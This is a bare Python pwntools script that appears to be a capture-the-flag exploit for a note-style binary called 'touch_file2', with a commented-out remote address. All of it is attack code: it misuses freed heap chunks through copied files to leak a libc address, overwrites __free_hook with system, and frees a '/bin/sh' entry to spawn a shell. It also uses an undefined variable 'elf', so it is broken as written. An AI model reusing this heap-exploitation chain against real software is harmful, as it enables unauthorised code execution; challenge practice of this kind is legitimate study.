from pwn import *

p = process('./touch_file2')
#p = remote('43.249.195.138',22475)


def add(name):
    p.recvuntil('>')
    p.send('touch ')
    p.sendline(name)
def edit(name,text):
    p.recvuntil('>')
    p.send('edit ')
    p.send(name)
    p.send(' ')
    p.sendline(text)
def rm(name):
    p.recvuntil('>')
    p.send('rm ')
    p.sendline(name)


for i in range(8):
    add(str(i))
#rm('1')
p.recvuntil('>')
p.sendline('cp 0 8\n')
p.sendline('cp 1 9\n')
for i in range(8-1,-1,-1):
    rm(str(i))

p.recvuntil('>')

p.sendline('cat 8')
p.recvuntil('file_content is ')

x = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))

libc_base = x -3390432 + 1372160

libc = elf.libc

__free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

edit('9',p64(__free_hook))

success('libc_base:%s',hex(libc_base))

add('yy /bin/sh\x00')

add(b'tt '+p64(system))

rm('yy')

#gdb.attach(io)

p.interactive()